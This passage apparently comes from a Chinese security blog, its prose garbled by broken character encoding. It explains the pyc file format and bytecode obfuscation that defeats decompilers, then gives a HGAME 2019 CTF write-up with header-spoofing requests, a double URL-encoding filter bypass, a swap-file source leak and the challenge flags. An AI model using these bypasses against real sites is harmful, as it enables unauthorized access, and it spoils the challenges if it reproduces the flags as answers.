<h2 id="PyCodeObject"><a href="#PyCodeObject" class="headerlink" title="PyCodeObject"></a>PyCodeObject</h2><p>PyCodeObject æ˜¯ pyc æ–‡ä»¶çš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼Œå¦‚æœæƒ³è¦äº†è§£å®ƒçš„å…·ä½“ç”Ÿæˆæ–¹æ³•å’Œå®šä¹‰ï¼Œè¯·é˜…è¯» python æºä»£ç ä¸­çš„ Include&#x2F;code.h å’Œ Python&#x2F;marshal.c</p>
<p>ä¸€ä¸ª PyCodeObject åŒ…å«è®¸å¤šå°çš„ç»„æˆæˆéƒ¨åˆ†ï¼Œè¿™äº›å°éƒ¨åˆ†ç§°ä¸º PyObjectã€‚<br>æ ¹æ® 010 æ¨¡æ¿è§£æç»“æœï¼ŒPyObject ç¬¬ä¸€ä¸ªå­—èŠ‚æŒ‡æ˜äº†æ¥ä¸‹æ¥çš„å†…å®¹æ˜¯ä»€ä¹ˆç±»å‹ï¼Œä¾‹å¦‚ 0x63 å°±è¡¨ç¤ºåé¢è·Ÿç€çš„æ˜¯ byte-codeï¼Œæˆ–è€… 0x28 å°±è¡¨ç¤ºåé¢è·Ÿç€çš„æ˜¯å¸¸é‡åˆ—è¡¨ç­‰ç­‰ï¼Œè¿™é‡Œæœ‰ä¸€ä»½å®šä¹‰ç±»å‹ã®æºä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Python/marshal.c:22</span><br><span class="line">#define TYPE_NULL               &#x27;0&#x27;</span><br><span class="line">#define TYPE_NONE               &#x27;N&#x27;</span><br><span class="line">#define TYPE_FALSE              &#x27;F&#x27;</span><br><span class="line">#define TYPE_TRUE               &#x27;T&#x27;</span><br><span class="line">#define TYPE_STOPITER           &#x27;S&#x27;</span><br><span class="line">#define TYPE_ELLIPSIS           &#x27;.&#x27;</span><br><span class="line">#define TYPE_INT                &#x27;i&#x27;</span><br><span class="line">#define TYPE_INT64              &#x27;I&#x27;</span><br><span class="line">#define TYPE_FLOAT              &#x27;f&#x27;</span><br><span class="line">#define TYPE_BINARY_FLOAT       &#x27;g&#x27;</span><br><span class="line">#define TYPE_COMPLEX            &#x27;x&#x27;</span><br><span class="line">#define TYPE_BINARY_COMPLEX     &#x27;y&#x27;</span><br><span class="line">#define TYPE_LONG               &#x27;l&#x27;</span><br><span class="line">#define TYPE_STRING             &#x27;s&#x27;</span><br><span class="line">#define TYPE_INTERNED           &#x27;t&#x27;</span><br><span class="line">#define TYPE_STRINGREF          &#x27;R&#x27;</span><br><span class="line">#define TYPE_TUPLE              &#x27;(&#x27;</span><br><span class="line">#define TYPE_LIST               &#x27;[&#x27;</span><br><span class="line">#define TYPE_DICT               &#x27;&#123;&#x27;</span><br><span class="line">#define TYPE_CODE               &#x27;c&#x27;</span><br><span class="line">#define TYPE_UNICODE            &#x27;u&#x27;</span><br><span class="line">#define TYPE_UNKNOWN            &#x27;?&#x27;</span><br><span class="line">#define TYPE_SET                &#x27;&lt;&#x27;</span><br><span class="line">#define TYPE_FROZENSET          &#x27;&gt;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>PyCodeObject çš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†è‚¯å®šæ˜¯ TYPE_CODEï¼Œè¡¨ç¤ºå­—èŠ‚ç åŒºå—ï¼Œè¿™ä¹Ÿæ˜¯é‡ç‚¹çš„å…³æ³¨éƒ¨åˆ†ï¼Œé™¤äº† TYPE_CODEï¼Œä¸‹é¢çš„å­—æ®µå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">argcount  å‚æ•°ä¸ªæ•°</span><br><span class="line">nlocals   å±€éƒ¨å˜é‡ä¸ªæ•°</span><br><span class="line">stacksize æ ˆç©ºé—´å¤§å°</span><br><span class="line">flags     N/A</span><br><span class="line">TYPE_STRING è¡¨ç¤ºå­—èŠ‚ç å¼€å§‹</span><br><span class="line">r_long n  å­—èŠ‚ç çš„æ•°é‡</span><br><span class="line">struct Instruction inst[] å­—èŠ‚ç åºåˆ—</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬ä¸»è¦å…³æ³¨å­—èŠ‚ç ï¼Œå­—èŠ‚ç ç±»ä¼¼äºæœºå™¨ç ï¼Œå¯ä»¥é€šè¿‡ä¸€å®šçš„æ‰‹æ®µå°†å®ƒä»¬è½¬æ¢æˆç±»ä¼¼äºæ±‡ç¼–è¯­è¨€çš„å¯è¯»ä»£ç ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° python è‡ªå¸¦çš„æ¨¡å— disã€‚<br>ç¼–å†™ä¸‹é¢çš„è„šæœ¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import dis</span><br><span class="line"></span><br><span class="line">pyc = read(&quot;test1.pyc&quot;, &quot;rb&quot;)</span><br><span class="line">pyc.read(30)</span><br><span class="line">target = pyc.read(0x31)</span><br><span class="line">dis.dis(target)</span><br></pre></td></tr></table></figure></div>
<p>å°±å¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä»£ç <br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-2.png"
                      alt="image"
                ></p>
<p>ä»å·¦åˆ°å³åˆ†ä¸ºå››åˆ—ï¼Œç¬¬ä¸€åˆ—ä»£è¡¨å­—èŠ‚åç§»é‡ï¼Œç¬¬äºŒåˆ—æ˜¯æŒ‡ä»¤æ“ä½œç çš„å«ä¹‰ï¼Œç¬¬ä¸‰åˆ—æ˜¯æ“ä½œæ•°ï¼Œç¬¬å››åˆ—æ˜¯æ“ä½œæ•°çš„è¯´æ˜ã€‚<br>ç®€å•åˆ†å°±èƒ½å¾—å‡ºä»£ç é€»è¾‘</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 0 LOAD_CONST          0 (0)    # è¯»å–å¸¸é‡åˆ—è¡¨ä¸­çš„ 0 å·å¸¸é‡</span><br><span class="line"> 3 MAKE_FUNCTION       0      # åˆ¶ä½œä¸€ä¸ªå‡½æ•°</span><br><span class="line"> 6 STORE_NAME          0 (0)  # å‡½æ•°å‘½åä¸ºå­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„ 0 å·</span><br><span class="line"> 9 LOAD_CONST          1 (1)</span><br><span class="line">12 MAKE_FUNCTION       0</span><br><span class="line">15 STORE_NAME          1 (1)</span><br><span class="line">18 LOAD_NAME           0 (0)  # å–å‡ºå‡½æ•° 1</span><br><span class="line">21 CALL_FUNCTION       0     # è°ƒç”¨</span><br><span class="line">24 STORE_NAME          2 (2) # å­˜å‚¨è¿”å›å€¼</span><br><span class="line">27 LOAD_NAME           1 (1) </span><br><span class="line">30 CALL_FUNCTION       0</span><br><span class="line">33 STORE_NAME          3 (3)</span><br><span class="line">36 LOAD_NAME           2 (2)   # å–å‡ºä¸¤ä¸ªè¿”å›å€¼</span><br><span class="line">39 LOAD_NAME           3 (3)</span><br><span class="line">42 BINARY_ADD                 # ç›¸åŠ </span><br><span class="line">43 PRINT_ITEM                 # æ‰“å°ç»“æœ</span><br><span class="line">44 PRINT_NEWLINE</span><br><span class="line">45 LOAD_CONST          2 (2)</span><br><span class="line">48 RETURN_VALUE</span><br></pre></td></tr></table></figure></div>
<p>è¿™å°±æ˜¯ç®€å•çš„å­—èŠ‚ç åˆ†æï¼Œè¦æ³¨æ„æˆ‘ä»¬çš„ç¨‹åºä¸åŒ…å«å¤æ‚çš„ä»£ç ï¼Œå¦‚æœä¸€ä¸ªå¤§å‹ç¨‹åºè¢«ç¼–è¯‘æˆäº† pyc æ–‡ä»¶ï¼Œå°±éš¾ä»¥åˆ†æäº†ã€‚ </p>
<p>TYPE_CODE ä¹‹åå°±æ˜¯å…¶ä»–çš„ PyObjectï¼Œä¾‹å¦‚æœ¬ä¾‹ä¸­å‰©ä½™çš„æœ‰</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">consts å¸¸é‡åˆ—è¡¨</span><br><span class="line">names  å­—ç¬¦ä¸²åˆ—è¡¨</span><br><span class="line">varnames å±€éƒ¨å˜é‡ååˆ—è¡¨</span><br><span class="line">freevars è‡ªç”±å˜é‡ååˆ—è¡¨</span><br><span class="line">cellvars å•å…ƒå˜é‡ååˆ—è¡¨</span><br><span class="line">filename æ–‡ä»¶å</span><br><span class="line">name     N/A</span><br></pre></td></tr></table></figure></div>
<p>è¿™äº›éƒ¨åˆ†çš„ç»“æ„å¤§åŒå°å¼‚ï¼Œå°±ä¸ä¸€ä¸€åˆ†æäº†ã€‚  </p>
<p>è¿™é‡Œæœ‰ä¸€ä»½ PyCodeObject çš„å…·ä½“å®šä¹‰ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥ä»”ç»†çœ‹çœ‹ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Include/code.h</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    int co_argcount;        /* #arguments, except *args */</span><br><span class="line">    int co_nlocals;     /* #local variables */</span><br><span class="line">    int co_stacksize;       /* #entries needed for evaluation stack */</span><br><span class="line">    int co_flags;       /* CO_..., see below */</span><br><span class="line">    PyObject *co_code;      /* instruction opcodes */</span><br><span class="line">    PyObject *co_consts;    /* list (constants used) */</span><br><span class="line">    PyObject *co_names;     /* list of strings (names used) */</span><br><span class="line">    PyObject *co_varnames;  /* tuple of strings (local variable names) */</span><br><span class="line">    PyObject *co_freevars;  /* tuple of strings (free variable names) */</span><br><span class="line">    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */</span><br><span class="line">    /* The rest doesn&#x27;t count for hash/cmp */</span><br><span class="line">    PyObject *co_filename;  /* string (where it was loaded from) */</span><br><span class="line">    PyObject *co_name;      /* string (name, for reference) */</span><br><span class="line">    int co_firstlineno;     /* first source line number */</span><br><span class="line">    PyObject *co_lnotab;    /* string (encoding addr&lt;-&gt;lineno mapping) See</span><br><span class="line">                   Objects/lnotab_notes.txt for details. */</span><br><span class="line">    void *co_zombieframe;     /* for optimization only (see frameobject.c) */</span><br><span class="line">    PyObject *co_weakreflist;   /* to support weakrefs to code objects */</span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure></div>

<p>ä¸‹é¢è¦æä¸€ä¸‹ PyCodeObject çš„ç»†èŠ‚ï¼Œå¦‚æœä½ åŠ¨æ‰‹æ“ä½œå¯èƒ½ä¼šå‘ç°ï¼Œä¸€ä¸ª pyc æ–‡ä»¶é‡Œé¢åŒ…å«å¾ˆå¤šçš„ PyCodeObjectï¼Œå®é™…ä¸Šï¼Œä¸€ä¸ª PyCodeObject çš„å®šä¹‰èŒƒå›´æ˜¯æœ‰é™çš„ï¼Œä¾‹å¦‚ä¸€ä¸ªå‡½æ•°å°±å®šä¹‰åœ¨ä¸€ä¸ª PyCodeObject é‡Œé¢ï¼Œä¸€ä¸ªç±»ã€é—­åŒ…ç­‰ç­‰éƒ½åˆ†åˆ«å®šä¹‰åœ¨ä¸åŒçš„  PyCodeObject é‡Œã€‚<br>è¿™å¼ å›¾ç‰‡å¯ä»¥å¸®åŠ©ç†è§£<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-3.png"
                      alt="image"
                ></p>
<h2 id="PYC-å­—èŠ‚ç å¤„ç†"><a href="#PYC-å­—èŠ‚ç å¤„ç†" class="headerlink" title="PYC å­—èŠ‚ç å¤„ç†"></a>PYC å­—èŠ‚ç å¤„ç†</h2><p>ä¿æŠ¤ python ç¨‹åºéš¾åº¦å¾ˆé«˜ï¼Œå› ä¸º python ç¨‹åºçš„è½½ä½“ .py å°±æ˜¯æºä»£ç æ–‡ä»¶ï¼Œè™½ç„¶æœ‰ pyc è¿™ç§ä¸èƒ½ç›´æ¥çœ‹æ‡‚çš„æ–‡ä»¶ï¼Œä½†æ˜¯ç”±äº uncompyle6 è¿™æ ·çš„ç¥å™¨å­˜åœ¨ï¼Œè§£æå®ƒä¹Ÿä¸åœ¨è¯ä¸‹ï¼Œç›®å‰ä¿æŠ¤ python ç¨‹åºçš„æ€è·¯ä¸€èˆ¬æ˜¯å¯¹å˜é‡åè¿›è¡Œæ··æ·†ï¼Œæˆ–è€…æ“ä½œ pyc æ–‡ä»¶æ··æ·†å­—èŠ‚ç ï¼Œæ˜¾ç„¶åè€…çš„æ•ˆæœè¦æ›´å¥½ä¸€äº›ã€‚<br>python ä¹Ÿå¥½ C è¯­è¨€ä¹Ÿç½¢ï¼Œä¸‡å˜ä¸ç¦»å…¶å®—ï¼Œpython çš„å­—èŠ‚ç å¤„ç†å…¶å®å’Œæ··æ·†ä¸€ä¸ª exe ç¨‹åºç±»ä¼¼ï¼Œç®€å•çš„åŒ…æ‹¬è·³è½¬æ··æ·†ã€æ§åˆ¶æµæ··æ·†ï¼Œå¤æ‚ä¸€äº›çš„å¯èƒ½æ¶‰åŠ byte-code åŠ å¯†ç­‰ç­‰ã€‚<br>æˆ‘ä»¬æ‹¿å‡ºæœ€ç®€å•çš„ä¸€ç§æ–¹æ³•åˆ†æï¼Œé€šè¿‡å¼ºåˆ¶è·³è½¬å¹²æ‰°åç¼–è¯‘å™¨çš„å·¥ä½œã€‚<br>é¦–å…ˆè¦äº†è§£ä¸€äº›å­—èŠ‚ç çš„çŸ¥è¯†ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç è·å–ä½ å½“å‰ç‰ˆæœ¬çš„ python å­—èŠ‚ç è¡¨</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import opcode  </span><br><span class="line">for op in range(len(opcode.opname)):  </span><br><span class="line">  print(&#x27;0x%.2X(%.3d): %s&#x27; % (op, op, opcode.opname[op]))  </span><br></pre></td></tr></table></figure></div>
<p>åœ¨ pyc æ–‡ä»¶ä¸­ï¼Œå­—èŠ‚ç çš„æ ¼å¼ä¸€èˆ¬æ˜¯ opcode + æ“ä½œæ•°ï¼Œå¦‚æœæƒ³è¦åˆ©ç”¨å¼ºåˆ¶è·³è½¬å®ç°å­—èŠ‚ç æ··æ·†çš„è¯ï¼Œé¦–å…ˆè¦æ‰¾åˆ°å¼ºåˆ¶è·³è½¬çš„å­—èŠ‚ç ï¼Œæˆ‘çš„æœºå™¨ä¸Šè¿™æ¡æŒ‡ä»¤å­—èŠ‚ç æ˜¯ 0x71ï¼Œæˆ‘ä»¬ä¼šå°è¯•æ„é€ è¿™ç§ç»“æ„<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-4.png"
                      alt="image"
                ></p>
<p>uncompyle çš„å·¥ä½œåŸç†å’Œä¸€èˆ¬çš„åç¼–è¯‘å™¨ç±»ä¼¼ï¼Œå®ƒä¼šå°½åŠ›å»åŒ¹é…æ¯ä¸€æ¡æŒ‡ä»¤ï¼Œå°è¯•å°†æ‰€æœ‰æŒ‡ä»¤éƒ½è¦†ç›–åˆ°ï¼Œä½†æ˜¯åœ¨è§£æä¸Šé¢çš„ä»£ç æ—¶ï¼Œç¢°åˆ° load ä¸å­˜åœ¨çš„å¸¸é‡æ—¶å°±ä¼šå‡ºé”™ï¼Œæ— æ³•ç»§ç»­åç¼–è¯‘ã€‚<br>æŒ‰ç…§æ€è·¯å°† pyc ä¿®æ”¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-5.png"
                      alt="image"
                ><br>(0x37 æ˜¯ä¿®æ”¹çš„å­—èŠ‚ï¼Œå‰©ä¸‹çš„æ˜¯æ·»åŠ çš„å­—èŠ‚)ä¿®æ”¹ä¹‹åçš„æ–‡ä»¶è¿˜æ˜¯èƒ½æ­£å¸¸è¿è¡Œï¼Œä½¿ç”¨ python test1.pyc å³å¯è¿è¡Œã€‚</p>
<p>ç„¶åä¸¢åˆ° linux å°è¯• uncompyle6 åç¼–è¯‘<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-6.png"
                      alt="image"
                ><br>æç¤ºå…ƒç»„è¶Šç•Œï¼Œè¿™å°±æ˜¯åç¼–è¯‘åˆ° 649000 è¿™å¥ä»£ç æ—¶å°è¯•è®¿é—®éæ³•å†…å­˜å¯¼è‡´çš„ï¼<br>ç±»ä¼¼çš„æ“ä½œæ‰‹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œå…·ä½“æ€è·¯å¯ä»¥å‚è€ƒå¦‚ä½•æ··æ·†ä¸€ä¸ª exe ç¨‹åºã€‚  </p>
<p><strong>ç ´é‡œæ²‰èˆŸ</strong>ï¼š ä¸€ä¸ªæ€è·¯æ˜¯æŠŠ python æºä»£ç å–ä¸‹æ¥ï¼Œå°†å†…éƒ¨çš„ opcode éƒ¨åˆ†è¿›è¡Œé‡æ–°æ’åºå†ç¼–è¯‘å› python è§£é‡Šå™¨ï¼Œç”¨è¿™ç§è§£é‡Šå™¨ç¼–è¯‘çš„ pyc ä»£ç ç”¨ä¸€èˆ¬æ‰‹æ®µæ˜¯ä¸èƒ½åç¼–è¯‘çš„ï¼Œè¿™å°±æ˜¯ byte-code åŠ å¯†ï¼Œæ¡ˆä¾‹å¯ä»¥å‚è€ƒ<a class="link"   href="https://juejin.im/entry/58bacfec1b69e6006b1a9c65" >ã€Šé˜´é˜³å¸ˆï¼šä¸€ä¸ªéé…‹çš„é€†å‘æ—…ç¨‹ã€‹<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>pyc æ–‡ä»¶æ ¼å¼ç›¸è¾ƒäº peã€elf ç­‰è€æ²¹æ¡æ¥è¯´è¿˜æ˜¯ç›¸å½“å‹å¥½çš„ï¼Œè¿™å¾—ç›Šäº Pythonçš„è®¾è®¡å“²å­¦ â€“ pythonä¹‹ç¦…</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¼˜ç¾èƒœäºä¸‘é™‹</span><br><span class="line">æ˜äº†èƒœäºæ™¦æ¶©</span><br></pre></td></tr></table></figure></div>
<p>å½“ç„¶ï¼Œè¿™ç§ç®€æ´è‡³ä¸Šçš„è®¾è®¡æ€æƒ³ä¹Ÿå†³å®šäº† python ä¸èƒ½ä»¥æ•ˆç‡è‡´èƒœï¼Œä¸è¿‡è¿™ä¹Ÿæ— æ³•é˜»æŒ¡ç¨‹åºå‘˜å¯¹å®ƒçš„çƒ­çˆ±ã€‚</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://rednaxelafx.iteye.com/blog/382412" >python å­—èŠ‚ç ä¸€è§ˆ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://kdr2.com/tech/python/pyc-format.html" >PYCæ–‡ä»¶æ ¼å¼åˆ†æ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="http://python.jobbole.com/84599/" >Pythonç¨‹åºçš„æ‰§è¡ŒåŸç†<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://www.cnblogs.com/xuchunlin/p/6986247.html" >python ä¹‹ç¦…<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>HGAME 2019 week1</title>
    <url>/2019/02/02/hgame-2019/</url>
    <content><![CDATA[<p>æ„Ÿè°¢æ­ç”µçš„å¸ˆå‚…ä»¬ä¸¾åŠçš„ç²¾å½©æ¯”èµ›ï¼</p>
<span id="more"></span>

<h2 id="è°åƒäº†æˆ‘çš„-flag"><a href="#è°åƒäº†æˆ‘çš„-flag" class="headerlink" title="è°åƒäº†æˆ‘çš„ flag"></a>è°åƒäº†æˆ‘çš„ flag</h2><p>æ ¹æ®é¢˜ç›®æç¤ºæƒ³åˆ°åº”è¯¥æ˜¯ vim ä»£ç æ³„éœ²ï¼Œç›´æ¥è®¿é—®</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://118.25.111.31:10086/.index.html.swp</span><br></pre></td></tr></table></figure></div>
<p>ä¸‹è½½åˆ°é¢˜ç›®çš„æºä»£ç ï¼Œåœ¨ linux ä¸‹ä½¿ç”¨å‘½ä»¤ vim -r index.html.swp å³å¯è¿˜åŸå‡º flagã€‚</p>
<p>flag: hgame{3eek_diScl0Sure_fRom+wEbsit@}</p>
<h2 id="æ¢å¤´å¤§ä½œæˆ˜"><a href="#æ¢å¤´å¤§ä½œæˆ˜" class="headerlink" title="æ¢å¤´å¤§ä½œæˆ˜"></a>æ¢å¤´å¤§ä½œæˆ˜</h2><p>è€ƒå¯Ÿäº† header çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œæ‰“å¼€ç½‘é¡µåœ¨è¾“å…¥æ¡†ä¸­éšä¾¿å†™ä¸€ç‚¹ä¸œè¥¿ç„¶åç‚¹å‡»æäº¤<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/hgame2019-1.png"
                      alt="image"
                ><br>æç¤ºéœ€è¦ä½¿ç”¨ post æ–¹å¼æäº¤ï¼Œä½¿ç”¨ hackbar æäº¤ï¼Œä¹‹ååˆä¼šæç¤ºéœ€è¦æ·»åŠ  XFF å¤´ï¼Œæ„é€ ä¸‹é¢çš„è¯·æ±‚åŒ…ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /week1/how/index.php?want=yes HTTP/1.1</span><br><span class="line">Host: 120.78.184.111:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://120.78.184.111:8080/week1/how/index.php?want=yes</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: admin=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">want=yes</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€åˆæç¤ºè¦ä½¿ç”¨ waterfox æµè§ˆå™¨è®¿é—®ï¼Œå°† User-Agent æœ€åçš„ Firefox&#x2F;64.0 æ”¹æˆ Waterfox&#x2F;50.0 å³å¯<br>æ¥ç€è¦æ±‚ä» å“”å“©å“”å“©æ¥åˆ°è¿™ä¸ªç½‘ç«™ï¼Œä¿®æ”¹ Referer ä¸º <a class="link"   href="http://www.bilibili.com/" >www.bilibili.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> å³å¯ã€‚<br>æœ€åä¸€æ­¥è¦æ±‚æˆ‘ä»¬æ˜¯ adminï¼Œå°†cookie æ”¹æˆ admin&#x3D;1ã€‚</p>
<p>flag: hgame{hTTp_HeaDeR_iS_Ez}</p>
<h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>é¢˜ç›®ç»™å‡ºå¦‚ä¸‹ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&#x27;id&#x27;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;å¹²å·´çˆ¹&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;id&#x27;] = urldecode($_GET[&#x27;id&#x27;]);</span><br><span class="line">if($_GET[&#x27;id&#x27;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p>æ„æ€æ˜¯è¦æäº¤ä¸€ä¸ª get ç±»å‹çš„å‚æ•° idï¼Œå¹¶ä¸”ä¸èƒ½åŒ…å«å­—ç¬¦ä¸² vidarï¼Œä½†æ˜¯åœ¨ urldecode ä¹‹åæ˜¯ vidarã€‚<br>éå¸¸ç®€å•ï¼Œæˆ‘ä»¬å°† vidar urlç¼–ç ä¸¤æ¬¡ï¼ŒåŸå› æ˜¯æœåŠ¡å™¨æ¥å—åˆ°å‚æ•°ä¹‹åä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œç„¶åä»£ç ä¸­å†è§£ç ä¸€æ¬¡ã€‚  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</span><br></pre></td></tr></table></figure></div>

<p>flag: hgame{urlDecode_Is_GoOd}</p>
<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>F12 æ‰¾åˆ°å¦ä¸€ä¸ªé¡µé¢ f12.phpï¼Œä¹‹åéœ€è¦æˆ‘ä»¬ post ä¸€ä¸ªå¯†ç ï¼Œå¯†ç å°±åœ¨è¿”å›åŒ…çš„å¤´éƒ¨</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: woyaoflag</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç»™å‡ºäº†ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹è¿›å»è¯´å¤ªå¿«äº†ï¼Œé‚£ä¹ˆæŠ“åŒ…å†å‘é€ã€‚</p>
<p>flag: hgame{f12_1s_aMazIng111}</p>
<h2 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h2><p>é¢˜ç›®ç›´æ¥ç»™äº†æºä»£ç ï¼Œå…¶å®å°±æ˜¯å®ç°äº†ä¸€ä¸ª brainfuck è§£é‡Šå™¨ï¼Œæœ‰å…³äº brainfuck çš„è¯­æ³•åœ¨ç½‘ä¸Šæœ‰å¾ˆå¤šã€‚<br>åˆ†æç»™å‡ºçš„é‚£æ®µ brainfuck ä»£ç å°±å¯ä»¥äº†ï¼Œç”±äº â€œ,â€ æ˜¯è¾“å…¥ï¼Œæ‰€ä»¥æŠŠæ•´ä¸ªç¨‹åºåˆ†æˆ 9 æ®µï¼Œæ¯ä¸€æ®µä»£è¡¨ flag ä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼Œé€šè¿‡ä¸Šé¢çš„æç¤ºï¼Œä½¿ç¨‹åºä¸è¾“å‡ºä»»ä½•å†…å®¹çš„è¾“å…¥ä¸ºæ­£ç¡®çš„ flagï¼Œä»¥ç¬¬ä¸€æ®µä»£ç ä¸ºä¾‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]</span><br><span class="line"></span><br><span class="line">,     è¾“å…¥</span><br><span class="line">&gt;     æŒ‡é’ˆåç§»</span><br><span class="line">++++++++++  å¾ªç¯å˜é‡è®¾ç½®ä¸º 10</span><br><span class="line">loop:</span><br><span class="line">    [       å¼€å§‹å¾ªç¯</span><br><span class="line">    &lt;       æŒ‡é’ˆå·¦ç§»ä¸€ä½(æŒ‡å‘è¾“å…¥çš„å­—ç¬¦)</span><br><span class="line">    ----------  è¾“å…¥çš„å­—ç¬¦è‡ªå‡ 10</span><br><span class="line">    &gt;       æŒ‡é’ˆå³ç§»ä¸€ä½(æŒ‡å‘å¾ªç¯å˜é‡)</span><br><span class="line">    -       å¾ªç¯å˜é‡è‡ªå‡ 1</span><br><span class="line">    ]       åˆ¤æ–­æ˜¯å¦ç»“æŸ</span><br><span class="line">&lt;     æŒ‡é’ˆå·¦ç§»ï¼ŒæŒ‡å‘è¾“å…¥çš„å­—ç¬¦</span><br><span class="line">++    è‡ªå¢ 2</span><br><span class="line">loop:  (è¦æ±‚è¿™ä¸ªå¾ªç¯ä¸èƒ½æ‰§è¡Œ)</span><br><span class="line">    [       å¼€å§‹å¾ªç¯</span><br><span class="line">    +       è‡ªå¢ 1</span><br><span class="line">    .       è¾“å‡ºå­—ç¬¦       </span><br><span class="line">    ]       ç»“æŸå¾ªç¯       </span><br><span class="line">é€»è¾‘ï¼š è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå‡å» 100 å†åŠ  2, æœ€åè¦æ±‚ç­‰äºé›¶</span><br><span class="line">x - 100 + 2 == 0 --&gt; 98 --&gt; b</span><br></pre></td></tr></table></figure></div>
